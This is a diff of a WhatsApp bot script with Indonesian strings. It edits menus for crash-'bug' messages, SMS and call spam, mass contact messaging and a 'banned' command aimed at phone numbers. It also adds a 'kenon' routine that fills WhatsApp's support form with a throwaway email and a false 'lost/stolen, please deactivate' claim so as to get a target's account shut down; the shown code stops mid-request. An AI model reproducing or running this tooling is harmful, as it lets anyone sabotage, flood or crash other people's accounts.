+┣❏ꜱᴇɴᴅɢᴀꜱꜰᴜʟʟ (628xxxx)
+┣❏ꜱᴇɴᴅᴜɴʟɪᴛʀᴏʟɪ (628xxxx)
+┣❏ꜱᴇɴᴅᴜɴʟɪᴅᴏᴄᴜ (628xxxx)
+┣❏ꜱᴇɴᴅᴜɴʟɪᴄᴜʏ (628xxxx)
+┣❏ꜱᴇɴᴅᴜɴʟɪʙᴏᴍ (628xxxx)
+┣❏ꜱᴇɴᴅᴜɴʟɪʟᴀɢ (628xxxx)
+┣❏ꜱᴇɴᴅᴜɴʟɪᴅᴇʟᴀʏ (628xxxx)
 ┗━━⊱
-*SEND TO DM*
+*SEND TOGROUP ID*
 ┏━━⊱
-┣❏🌷 (234xxxx)
-┣❏🐲 (234xxxx)
-┣❏🐉 (234xxxx)
-┣❏🌵 (234xxxx)
-┣❏🎄 (234xxxx) 
-┣❏🌲 (234xxxx)
-┣❏🌳 (234xxxx)
-┣❏🌴 (234xxxx)
-┣❏🌱 (234xxxx)
-┣❏🌿 (234xxxx)
-┣❏☘️ (234xxxx)
-┣❏🍀 (234xxxx)
-┣❏🐵 (234xxxx)
-┣❏🙈 (234xxxx)
-┣❏🙉 (234xxxx)
-┣❏🙊 (234xxxx)
-┣❏🐒 (234xxxx)
-┣❏ꜱᴀɴᴛᴇᴛ (234xxxx)
-┣❏ꜱᴇɴᴅɢᴀꜱꜰᴜʟʟ (234xxxx)
-┣❏ꜱᴇɴᴅᴜɴʟɪᴛʀᴏʟɪ (234xxxx)
-┣❏ꜱᴇɴᴅᴜɴʟɪᴅᴏᴄᴜ (234xxxx)
-┣❏ꜱᴇɴᴅᴜɴʟɪᴄᴜʏ (234xxxx)
-┣❏ꜱᴇɴᴅᴜɴʟɪʙᴏᴍ (234xxxx)
-┣❏ꜱᴇɴᴅᴜɴʟɪʟᴀɢ (234xxxx)
-┣❏ꜱᴇɴᴅᴜɴʟɪᴅᴇʟᴀʏ (234xxxx)
-┗━━⊱
-*SEND TO GROUP ID*
-┏━━⊱
+┣❏ɢᴀꜱꜰᴜʟʟɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
+┣❏ꜱᴀɴᴛᴇᴛɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
 ┣❏ᴛʀᴏʟɪɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
 ┣❏ᴅᴏᴄᴜɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
-┣❏ɢᴀꜱꜰᴜʟʟɢᴄ (ɢᴄ ʟɪɴᴋ)
-┣❏ꜱᴀɴᴛᴇᴛɢᴄ (ɢᴄ ʟɪɴᴋ)
-┣❏ᴜɴʟɪᴅᴇʟᴀʏɢᴄ (ɢᴄ ʟɪɴᴋ)
-┣❏ᴜɴʟɪʟᴀɢɢᴄ (ɢᴄ ʟɪɴᴋ)
-┣❏ᴜɴʟɪʙᴏᴍɢᴄ (ɢᴄ ʟɪɴᴋ)
-┣❏ᴜɴʟɪᴄᴜʏɢᴄ (ɢᴄ ʟɪɴᴋ)
+┣❏ᴜɴʟɪᴅᴇʟᴀʏɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
+┣❏ᴜɴʟɪʟᴀɢɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
+┣❏ᴜɴʟɪʙᴏᴍɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
+┣❏ᴜɴʟɪᴄᴜʏɢᴄ (ɪᴅ ɢʀᴏᴜᴘ)
 ┗━━⊱
-*UNLIMITED*
+*BUG SPAM IN PLACE*
 ┏━━⊱
 ┣❏ᴜɴʟɪᴛᴇᴛ
 ┣❏ᴜɴʟɪᴛʀᴏʟɪ
@@ -802,84 +407,74 @@ Total Users Premium :  ${owner.length}
 *BONUS*
 ┏━━⊱
 ┣❏ᴅᴜx
-┣❏ᴅᴜxx
+┣❏ᴅᴜx
 ┗━━⊱
-[ *DUX BOT UNLEASHED* ]`)
+[ *BOT VERSION* ]`)
 }
 break
 //=================================================//
 case 'groupmenu': {
 await loading()
 m.reply(`Heyyo ${pushname} 🌝 What's Good ${salam}
-Total Users Premium :  ${owner.length}
-Status : ${isCreator ? 'Premium' : 'Free'}
+Total users Premium :  ${owner.length}
+Status : ${isCreator ? 'Owner' : 'Free'}
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ${prefix} welcome on / off
 ${prefix} antilink on / off
 ${prefix} antitoxic on / off
-${prefix} pushkontak (texts)
+${prefix} pushkontak (textnya)
 ${prefix} pushcontid (id group)
-${prefix} bcgc (texts)
-${prefix} openai (texts)
-${prefix} hidetag (texts)
-${prefix} kick (234xx)
-${prefix} add (234xx)
-${prefix} promote (234xx)
-${prefix} demote (234xx)
-${prefix} sendlinkgc (234xx)
+${prefix} bcgc (textnya)
+${prefix} openai (textnya)
+${prefix} hidetag (textnya)
+${prefix} kick (628xx)
+${prefix} add (628xx)
+${prefix} promote (628xx)
+${prefix} demote (628xx)
+${prefix} sendlinkgc (628xx)
 ${prefix} editgroup close / open
 ${prefix} editinfo on / off
 ${prefix} join (linknya)
-${prefix} editsubject (texts)
-${prefix} editdesk (texts)
-${prefix} tagall (texts)
+${prefix} editsubject (textnya)
+${prefix} editdesk (textnya)
+${prefix} tagall (textnya)
 ${prefix} inspect (linknya)
 ${prefix} linkgroup
 ${prefix} resetlinkgc
 ${prefix} promoteall
 ${prefix} demoteall
-${prefix} larangan
-${prefix} virgam
-${prefix} buatsw
-${prefix} buatswimage
-${prefix} buatswvideo
-${prefix} swin
-${prefix} vnsw
-${prefix} buatswptv
-${prefix} toptv
-${prefix} buatsws`)
+${prefix} larangan`)
 }
 break
 //=================================================//
 case 'downloadmenu': {
 await loading()
 m.reply(`Heyyo ${pushname} 🌝 What's Good ${salam}
-Total Users Premium :  ${owner.length}
-Status : ${isCreator ? 'Premium' : 'Free'}
+Total users Premium :  ${owner.length}
+Status : ${isCreator ? 'Owner' : 'Free'}
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ${prefix} fbvideo (linknya)
-${prefix} fbreels (linknya)
 ${prefix} igvideo (linknya)
-${prefix} igreels (linknya)
 ${prefix} twitvideo (linknya)
 ${prefix} tiktokvideo (linknya)
-${prefix} ytmp3 (linknya)
+${prefix} tiktokaudio (linknya)
+${prefix} ytvn (linknya)
 ${prefix} ytmp4 (linknya)
 ${prefix} ytsearch (linknya)
-${prefix} ytreels (linknya)
-${prefix} getmusic (reply hasil)
-${prefix} getvideo (reply hasil)`)
+${prefix} ytplay (linknya)
+${prefix} play (linknya)`)
 }
 break
 //=================================================//
 case 'randommenu': {
 await loading()
 m.reply(`Heyyo ${pushname} 🌝 What's Good ${salam}
-Total Users Premium :  ${owner.length}
-Status : ${isCreator ? 'Premium' : 'Free'}
+Total users Premium :  ${owner.length}
+Status : ${isCreator ? 'Owner' : 'Free'}
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ${prefix} owner
 ${prefix} sticker
+${prefix} qc (textnya)
 ${prefix} sewa
 ${prefix} nope
 ${prefix} lispanel
@@ -888,10 +483,10 @@ ${prefix} wm
 ${prefix} wmvideo
 ${prefix} emojimix
 ${prefix} emojimix2
-${prefix} attp (texts)
-${prefix} ttp (texts)
-${prefix} afk (texts)
-${prefix} gambar (texts)
+${prefix} attp (textnya)
+${prefix} ttp (textnya)
+${prefix} afk (textnya)
+${prefix} gambar (textnya)
 ${prefix} quotesanime
 ${prefix} faktaunik
 ${prefix} katabijak
@@ -902,12 +497,12 @@ ${prefix} tomp4
 ${prefix} tomp3
 ${prefix} toaud
 ${prefix} tovn
-${prefix} toaudio
 ${prefix} togif
 ${prefix} tourl
 ${prefix} smeme
 ${prefix} quotes
 ${prefix} darkjokes
+${prefix} bokep
 ${prefix} google
 ${prefix} couple
 ${prefix} coffe
@@ -929,8 +524,8 @@ break
 case 'islammenu': {
 await loading()
 m.reply(`Heyyo ${pushname} 🌝 What's Good ${salam}
-Total Users Premium :  ${owner.length}
-Status : ${isCreator ? 'Premium' : 'Free'}
+Total users Premium :  ${owner.length}
+Status : ${isCreator ? 'Owner' : 'Free'}
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ${prefix} jadwalsholat
 ${prefix} kisahnabi
@@ -944,63 +539,102 @@ break
 case 'gasmenu': {
 await loading()
 m.reply(`Heyyo ${pushname} 🌝 What's Good ${salam}
-Total Users Premium :  ${owner.length}
-Status : ${isCreator ? 'Premium' : 'Free'}
+Total users Premium :  ${owner.length}
+Status : ${isCreator ? 'Owner' : 'Free'}
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-${prefix} spamsms (234xx)
-${prefix} call (234xx)
-${prefix} kenon (234xx)
-${prefix} verif@ (234xx)
-${prefix} banned (234xx)
-${prefix} unbannedv2 (234xx)
-${prefix} unbannedv3 (234xx)
-${prefix} unbannedv4 (234xx)
-${prefix} unbannedv5 (234xx)`)
+${prefix} spamsms (628xx)
+${prefix} call (628xx)
+${prefix} kenon (628xx)
+${prefix} verif@ (628xx)
+${prefix} banned (628xx)
+${prefix} unbannedv2 (628xx)
+${prefix} unbannedv3 (628xx)
+${prefix} unbannedv4 (628xx)
+${prefix} unbannedv5 (628xx)`)
 }
 break
 //=================================================//
 case 'textmaker':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 let foottggkzo = `Runtime : ⏳ ${runtime(process.uptime())}
 Jam : ${time}`
 sendGeekzMessage(from, { 
 text: `Heyyo ${pushname} 🌝 What's Good ${salam}
-Total Users Premium :  ${owner.length}
-Status : ${isCreator ? 'Premium' : 'Free'}
+Total users Premium :  ${owner.length}
+Status : ${isCreator ? 'Owner' : 'Free'}
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-${prefix}blackpink
-${prefix}neon
-${prefix}greenneon
-${prefix}advanceglow
-${prefix}futureneon
-${prefix}sandwriting
-${prefix}sandsummer
-${prefix}sandengraved
-${prefix}metaldark
-${prefix}neonlight
-${prefix}holographic
-${prefix}text1917
-${prefix}minion
-${prefix}deluxesilver
-${prefix}newyearcard
-${prefix}bloodfrosted
-${prefix}halloween
-${prefix}jokerlogo
-${prefix}fireworksparkle
-${prefix}natureleaves
-${prefix}bokeh
-${prefix}toxic
-${prefix}strawberry
-${prefix}box3d
-${prefix}roadwarning
-${prefix}breakwall
-${prefix}icecold
-${prefix}luxury
-${prefix}cloud
-${prefix}summersand
-${prefix}horrorblood
-${prefix}thunder`,
+┏━━⊱
+┣❏ ᴄᴀɴᴅʏ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴄʜʀɪꜱᴛᴍᴀꜱ (ᴛᴇxᴛɴʏᴀ)
+┣❏ 3ᴅᴄʜʀɪꜱᴛᴍᴀꜱ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ꜱᴘᴀʀᴋʟᴇᴄʜʀɪꜱᴛᴍᴀꜱ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴅᴇᴇᴘꜱᴇᴀ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ꜱᴄɪꜰɪ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ʀᴀɪɴʙᴏᴡ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴡᴀᴛᴇʀᴘɪᴘᴇ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ꜱᴘᴏᴏᴋʏ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴘᴇɴᴄɪʟ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴄɪʀᴄᴜɪᴛ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴅɪꜱᴄᴏᴠᴇʀʏ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴍᴇᴛᴀʟɪᴄ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ꜰɪᴄᴛɪᴏɴ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴅᴇᴍᴏɴ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴛʀᴀɴꜱꜰᴏʀᴍᴇʀ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ʙᴇʀʀʏ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴛʜᴜɴᴅᴇʀ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴍᴀɢᴍᴀ (ᴛᴇxᴛɴʏᴀ)
+┣❏ 3ᴅꜱᴛᴏɴᴇ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ɴᴇᴏɴʟɪɢʜᴛ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ɢʟɪᴛᴄʜ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ʜᴀʀʀʏᴘᴏᴛᴛᴇʀ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ʙʀᴏᴋᴇɴɢʟᴀꜱꜱ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴘᴀᴘᴇʀᴄᴜᴛ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴡᴀᴛᴇʀᴄᴏʟᴏʀ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴍᴜʟᴛɪᴄᴏʟᴏʀ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ɴᴇᴏɴᴅᴇᴠɪʟ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴜɴᴅᴇʀᴡᴀᴛᴇʀ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ɢʀᴀꜰꜰɪᴛɪʙɪᴋᴇ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ꜱɴᴏᴡ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴄʟᴏᴜᴅ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ʜᴏɴᴇʏ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ɪᴄᴇ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ꜰʀᴜɪᴛᴊᴜɪᴄᴇ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ʙɪꜱᴄᴜɪᴛ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴡᴏᴏᴅ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴄʜᴏᴄᴏʟᴀᴛᴇ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ꜱᴛʀᴀᴡʙᴇʀʀʏ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴍᴀᴛʀɪx (ᴛᴇxᴛɴʏᴀ)
+┣❏ ʙʟᴏᴏᴅ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴅʀᴏᴘᴡᴀᴛᴇʀ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴛᴏxɪᴄ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ʟᴀᴠᴀ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ʀᴏᴄᴋ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ʙʟᴏᴏᴅɢʟᴀꜱ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ʜᴀʟʟᴏᴡᴇɴ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴅᴀʀᴋɢᴏʟᴅ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴊᴏᴋᴇʀ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴡɪᴄᴋᴇʀ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ꜰɪʀᴇᴡᴏʀᴋ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ꜱᴋᴇʟᴇᴛᴏɴ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ʙʟᴀᴄᴋᴘɪɴᴋ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ꜱᴀɴᴅ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ɢʟᴜᴇ (ᴛᴇxᴛɴʏᴀ)
+┣❏ 1917 (ᴛᴇxᴛɴʏᴀ)
+┣❏ ʟᴇᴀᴠᴇꜱ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴛʀᴀɴꜱꜰᴏʀᴍᴇʀ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ʜᴇʀʀʏᴘ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ɴᴇᴏɴᴅᴇᴠɪʟ (ᴛᴇxᴛɴʏᴀ)
+┣❏ 3ᴅꜱᴛᴏɴᴇ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴛʜᴜɴᴅᴇʀ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ɢʀᴀꜰꜰɪᴛɪ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ɢʟɪᴛᴄʜ3 (ᴛᴇxᴛɴʏᴀ)
+┣❏ 3ᴅʙᴏx (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴅʀᴀᴘᴡᴀᴛᴇʀ (ᴛᴇxᴛɴʏᴀ)
+┣❏ ʟɪᴏɴ2 (ᴛᴇxᴛɴʏᴀ)
+┣❏ ᴘᴀᴘᴇʀᴄᴜᴛ (ᴛᴇxᴛɴʏᴀ)
+┣❏
+┗━━⊱`,
 mentions:[sender],
 contextInfo:{
 mentionedJid:[sender],
@@ -1019,13 +653,13 @@ mentionedJid:[sender],
 break
 //=================================================//
 case 'listmusik':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 let footgkzoo = `Runtime : ⏳ ${runtime(process.uptime())}
 Jam : ${time}`
 sendGeekzMessage(from, { 
 text: `Heyyo ${pushname} 🌝 What's Good ${salam}
-Total Users Premium :  ${owner.length}
+Total users Premium :  ${owner.length}
 Status : ${isCreator ? 'Premium' : 'Free'}
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ${prefix} sound1
@@ -1207,7 +841,7 @@ mentionedJid:[sender],
 break
 //=================================================//
 case 'addmenu':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 var resio = await Quotes()
 teks = `\nAuthor: ${resio.author}\n`
 teks = `\nQuotes:\n`
@@ -1216,8 +850,8 @@ let footgkbzz = `Runtime : ⏳ ${runtime(process.uptime())}
 Jam : ${time}`
 sendGeekzMessage(from, { 
 text: `Heyyo ${pushname} 🌝 What's Good ${salam}
-Total Users Premium :  ${owner.length}
-Status : ${isCreator ? 'Premium' : 'Free'}
+Total users Premium :  ${owner.length}
+Status : ${isCreator ? 'Owner' : 'Free'}
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 *Kata - Kata Untuk Hari Ini*
 
@@ -1268,14 +902,14 @@ mentionedJid:[sender],
 break
 //=================================================//
 case 'cucimata':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
  await loading()
 let footgkzo = `Runtime : ⏳ ${runtime(process.uptime())}
 Jam : ${time}`
 sendGeekzMessage(from, { 
 text: `Heyyo ${pushname} 🌝 What's Good ${salam}
-Total Users Premium :  ${owner.length}
-Status : ${isCreator ? 'Premium' : 'Free'}
+Total users Premium :  ${owner.length}
+Status : ${isCreator ? 'Owner' : 'Free'}
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ${prefix} cecanindo
 ${prefix} cecanchina
@@ -1344,14 +978,14 @@ mentionedJid:[sender],
 break
 //=================================================//
 case 'beritamenu':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 let foottgkzo = `Runtime : ⏳ ${runtime(process.uptime())}
 Jam : ${time}`
 sendGeekzMessage(from, { 
 text: `Heyyo ${pushname} 🌝 What's Good ${salam}
-Total Users Premium :  ${owner.length}
-Status : ${isCreator ? 'Premium' : 'Free'}
+Total users Premium :  ${owner.length}
+Status : ${isCreator ? 'Owner' : 'Free'}
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ${prefix} fajar
 ${prefix} cnn
@@ -1389,14 +1023,14 @@ mentionedJid:[sender],
 break
 //=================================================//
 case 'asupan':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 await loading()
 let foottgkkzjo = `Runtime : ⏳ ${runtime(process.uptime())}
 Jam : ${time}`
 sendGeekzMessage(from, { 
 text: `Heyyo ${pushname} 🌝 What's Good ${salam}
-Total Users Premium :  ${owner.length}
-Status : ${isCreator ? 'Premium' : 'Free'}
+Total users Premium :  ${owner.length}
+Status : ${isCreator ? 'Owner' : 'Free'}
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ${prefix} asupan1
 ${prefix} asupan2
@@ -1436,13 +1070,13 @@ mentionedJid:[sender],
 break
 //=================================================//
 case 'funmenu':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
+if (isBan) return m.reply('*banned by owner Tolol*')
 let fooutgkzz = `Runtime : ⏳ ${runtime(process.uptime())}
 Jam : ${time}`
 sendGeekzMessage(from, { 
 text: `Heyyo ${pushname} 🌝 What's Good ${salam}
-Total Users Premium :  ${owner.length}
-Status : ${isCreator ? 'Premium' : 'Free'}
+Total users Premium :  ${owner.length}
+Status : ${isCreator ? 'Owner' : 'Free'}
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ┏━━⊱
 ┣❏ᴀʀᴛɪɴᴀᴍᴀ (ᴛᴇxᴛɴʏᴀ)
@@ -1487,53 +1121,9 @@ mentionedJid:[sender],
 }
 })
 break
-case 'gamemenu':
-if (isBan) return m.reply('*You are banned by the owner, you do not have to pretend*')
-let fooutgdhsikzz = `Runtime : ⏳ ${runtime(process.uptime())}
-Jam : ${time}`
-sendGeekzMessage(from, { 
-text: `Heyyo ${pushname} 🌝 What's Good ${salam}
-Total Users Premium :  ${owner.length}
-Status : ${isCreator ? 'Premium' : 'Free'}
-▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-┏━━⊱
-┣❏ᴛᴛᴄ
-┣❏ᴅᴇʟᴛᴄ
-┣❏ꜱᴜɪᴛᴘᴠᴘ
-┣❏ᴛᴇʙᴀᴋ ᴋᴀᴛᴀ
-┣❏ᴛᴇʙᴀᴋ ɢᴀᴍʙᴀʀ
-┣❏ᴛᴇʙᴀᴋ ʟɪʀɪᴋ
-┣❏ᴛᴇʙᴀᴋ ᴋᴀʟɪᴍᴀᴛ
-┣❏ᴛᴇʙᴀᴋ ʟᴀɢᴜ
-┣❏ᴛᴇʙᴀᴋ ʟᴏɴᴛᴏɴɢ
-┣❏ꜰᴀᴍɪʟʏ100
-┣❏ᴋᴜɪꜱᴍᴀᴛʜ ɴᴏᴏʙ
-┣❏ᴋᴜɪꜱᴍᴀᴛʜ ᴇᴀꜱʏ
-┣❏ᴋᴜɪꜱᴍᴀᴛʜ ᴍᴇᴅɪᴜᴍ
-┣❏ᴋᴜɪꜱᴍᴀᴛʜ ʜᴀʀᴅ
-┣❏ᴋᴜɪꜱᴍᴀᴛʜ ᴇxᴛʀᴇᴍᴇ
-┣❏ᴋᴜɪꜱᴍᴀᴛʜ ɪᴍᴘᴏꜱꜱɪʙʟᴇ
-┣❏ᴋᴜɪꜱᴍᴀᴛʜ ɪᴍᴘᴏꜱꜱɪʙʟᴇ2
-┗━━⊱`,
-mentions:[sender],
-contextInfo:{
-mentionedJid:[sender],
-"externalAdReply": {
-"showAdAttribution": true,
-"renderLargerThumbnail": true,
-"title": fooutgdhsikzz, 
-"containsAutoReply": true,
-"mediaType": 1, 
-"thumbnail": kalimage,
-"mediaUrl": gr,
-"sourceUrl": gr
-}
-}
-})
-break
 //=================================================//
 case 'pushcontid':{
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 let idgc = text.split("|")[0]
 let pesan = text.split("|")[1]
 if (!idgc && !pesan) return m.reply(`Example: ${prefix + command} idgc|pesan`)
@@ -1556,7 +1146,7 @@ m.reply(`*_Semua pesan telah dikirim!:_* *_✓_*\n*_Jumlah pesan terkirim:_* *_$
 break;
 //=================================================//
 case 'pushkontak':{
-if (!isCreator) return m.reply('*Special Premium*')
+if (!isCreator) return m.reply('*special Owner Bot*')
 if (!m.isGroup) return m.reply(`di group coy`)
 if (!text) return m.reply(`Teks Nya Kak?`)
 let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
@@ -1566,38 +1156,38 @@ for (let geek of mem) {
 await sleep(3000)
 haikal.sendMessage(geek, {text: `${teksnye}`}, {quoted:m})
 }
-m.reply(`*SUCCESSFULLY SENT  Ke ${mem.length} orang*`)
+m.reply(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
 }
 break
 //=================================================//
 case 'public': {
-if (!isCreator) return m.reply('*Special Premium*') 
+if (!isCreator) return m.reply(`*special Premium*`) 
 haikal.public = true
 m.reply('Sukse Change To Public')
 }
 break
 //=================================================//
 case 'self': {
-if (!isCreator) return m.reply('*Special Premium*') 
+if (!isCreator) return m.reply(`*special Premium*`) 
 haikal.public = false
-m.reply('SELF MODE')
+m.reply('Sukses Change To Self')
 }
 break
 //=================================================//
 case 'addprem':
-if (!isCreator) return 
-if (!args[0]) return m.reply(`Usersan ${prefix+command} nomor\nContoh ${prefix+command} 2347082252014`)
+if (!isCreator) return m.reply('*special Owner Bot*')
+if (!args[0]) return m.reply(`usersan ${prefix+command} nomor\nContoh ${prefix+command} 2347082252014`)
 bnnd = text.split("|")[0].replace(/[^0-9]/g, '')
 let ceknye = await haikal.onWhatsApp(bnnd + `@s.whatsapp.net`)
 if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 owner.push(bnnd)
 fs.writeFileSync('./premium.json', JSON.stringify(owner))
-m.reply(`Nomor ${bnnd} Telah Sudah Premium!!!`)
+m.reply(`Nomor ${bnnd} Telah Di Tambahkan Menjadi Premium!!!`)
 break
 //=================================================//
 case 'delprem':
-if (!isCreator) return 
-if (!args[0]) return m.reply(`Usersan ${prefix+command} nomor\nContoh ${prefix+command} 2347082252014`)
+if (!isCreator) return m.reply('*special Owner Bot*')
+if (!args[0]) return m.reply(`usersan ${prefix+command} nomor\nContoh ${prefix+command} 2347082252014`)
 yaki = text.split("|")[0].replace(/[^0-9]/g, '')
 unp = owner.indexOf(yaki)
 owner.splice(unp, 1)
@@ -1606,7 +1196,7 @@ m.reply(`Nomor ${yaki} Telah Di Hapus Dari Premium!!!`)
 break
 //=================================================//
 case 'listprem':
-if (isBan) return m.reply('*BANNED BY OWNER*')
+if (isBan) return m.reply('*Lu Di Ban Owner*')
  teksooo = '*List Premium*\n\n'
 for (let i of owner) {
 teksooo += `- ${i}\n`
@@ -1615,8 +1205,8 @@ teksooo += `\n*Total : ${owner.length}*`
 haikal.sendMessage(from, { text: teksooo.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": owner } })
 break
 //=================================================//
-case 'Users':  {
-if (!isCreator) return m.reply('*Special Premium*')
+case 'users':  {
+if (!isCreator) return m.reply(`*special Premium*`)
 if (!args[0]) return reply(`*Contoh : ${command} add 2347082252014*`)
 if (args[1]) {
 orgnye = args[1] + "@s.whatsapp.net"
@@ -1625,14 +1215,14 @@ orgnye = m.quoted.sender
 }
 const isBane = banned.includes(orgnye)
 if (args[0] === "add") {
-if (isBane) return reply('*Users Ini telah Di Ban*')
+if (isBane) return reply('*users Ini telah Di Ban*')
 banned.push(orgnye)
-reply(`Succes ban Users Ini`)
+reply(`Succes ban users Ini`)
 } else if (args[0] === "del") {
-if (!isBane) return reply('*Users Ini Telah Di hapus Dari Ban*')
+if (!isBane) return reply('*users Ini Telah Di hapus Dari Ban*')
 let delbans = banned.indexOf(orgnye)
 banned.splice(delbans, 1)
-reply(`*Berhasil Menghapus Users yang Di Ban*`)
+reply(`*Berhasil Menghapus users yang Di Ban*`)
 } else {
 reply("Error")
 }
@@ -1640,7 +1230,7 @@ reply("Error")
 break
 //=================================================//
 case 'listban':
-if (isBan) return m.reply('*BANNED BY OWNER*')
+if (isBan) return m.reply('*Lu Di Ban Owner*')
  teksooop = `*List Ban*\n\n`
 for (let ii of banned) {
 teksooop += `- ${ii}\n`
@@ -1653,8 +1243,50 @@ case 'owner': case 'crator':{
 }
 break
 //=================================================//
+ case 'kenon':
+if (!isCreator) return m.reply(`*special Premium*`)
+let cekno = await haikal.onWhatsApp(Input)
+if (cekno.length == 0) return m.reply(`Peserta tersebut Sudah Tidak Terdaftar Di WhatsApp`)
+var targetnya = m.sender.split('@')[0]
+  var axioss = require ("axios")
+  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
+let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
+let cookie = ntah.headers["set-cookie"].join("; ")
+const cheerio = require('cheerio');
+let $ = cheerio.load(ntah.data)
+let $form = $("form");
+let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
+let form = new URLSearchParams()
+form.append("jazoest", $form.find("input[name=jazoest]").val())
+form.append("lsd", $form.find("input[name=lsd]").val())
+form.append("step", "submit")
+form.append("country_selector", "ID")
+form.append("phone_number", q)
+form.append("email", email.data[0])
+form.append("email_confirm", email.data[0])
+form.append("platform", "ANDROID")
+form.append("your_message", "Verloren/gestohlen: Bitte deaktivieren Sie mein Konto")
+form.append("__user", "0")
+form.append("__a", "1")
+form.append("__csr", "")
+form.append("__req", "8")
+form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
+form.append("dpr", "1")
+form.append("__ccg", "UNKNOWN")
+form.append("__rev", "1007735016")
+form.append("__comment_req", "0")
+let res = await axioss({
+  url,
+  method: "POST",
